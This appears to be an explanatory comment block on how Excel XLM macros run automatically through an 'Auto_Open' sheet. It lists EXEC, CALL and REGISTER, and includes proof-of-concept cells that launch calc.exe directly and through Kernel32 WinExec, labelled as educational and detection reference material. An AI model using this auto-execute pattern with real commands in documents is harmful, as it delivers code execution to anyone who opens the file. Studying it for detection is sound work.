# =============================================
# HOW XLM MACROS WORK IN EXCEL:
# =============================================
# 
# XLM macros are stored as cells in a special macro sheet, not as VBA modules.
# The macro sheet can be named "Auto_Open" to execute automatically on file open.
#
# Key XLM macro functions:
#   =EXEC("command")     - Execute a shell command
#   =CALL(dll, func, ...) - Call DLL functions directly
#   =HALT()              - Stop macro execution
#   =RETURN()            - Return from macro
#   =REGISTER(dll, func) - Register a DLL function
#   =RUN(reference)      - Run a macro at a cell reference
#
# =============================================
# PoC STRUCTURE (educational reference):
# =============================================
#
# Sheet: Auto_Open (triggers on file open)
# +---------+---------------------------+
# |  Cell   |  XLM Formula              |
# +---------+---------------------------+
# |  A1     |  =EXEC("calc.exe")        |  <- PoC: launches calc.exe
# |  A2     |  =HALT()                  |  <- stop execution
# +---------+---------------------------+
#
# =============================================
# ADVANCED XLM PATTERN (for detection reference):
# =============================================
#
# Using CALL() to invoke WinAPI functions:
# A1: =REGISTER("Kernel32","WinExec","JCJ")  <- register WinExec
# A2: =CALL(A1,"calc.exe",1)                  <- call WinExec("calc.exe", SW_NORMAL)
# A3: =HALT()
